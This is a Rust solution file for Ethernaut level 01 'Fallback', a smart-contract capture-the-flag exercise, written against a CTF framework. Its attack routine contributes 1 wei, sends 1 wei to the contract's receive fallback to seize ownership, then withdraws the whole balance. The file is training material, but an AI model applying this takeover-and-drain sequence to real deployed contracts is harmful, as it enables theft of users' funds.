//! Ethernaut 01 — Fallback.
//!
//! Goal: Take ownership of `Fallback`, an Ether contribution contract, and
//! reduce its Ether balance to zero.
//!
//
// Upstream hint:
//
// Look carefully at the contract's code below.
//
// You will beat this level if
// 1) you claim ownership of the contract
// 2) you reduce its balance to 0
//
// Things that might help
// * How to send ether when interacting with an ABI
// * How to send ether outside of the ABI
// * Converting to and from wei/ether units (see `help()` command)
// * Fallback methods
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Fallback.sol

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl01_fallback::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract =
            Fallback::new(target.address, offender.provider().clone());

        println!("Calling contribute()...");
        contract
            .contribute()
            .value(U256::from(1))
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        println!("Calling receive()...");
        offender.transfer(target.address, U256::from(1)).await?;

        println!("Calling withdraw()...");
        contract
            .withdraw()
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
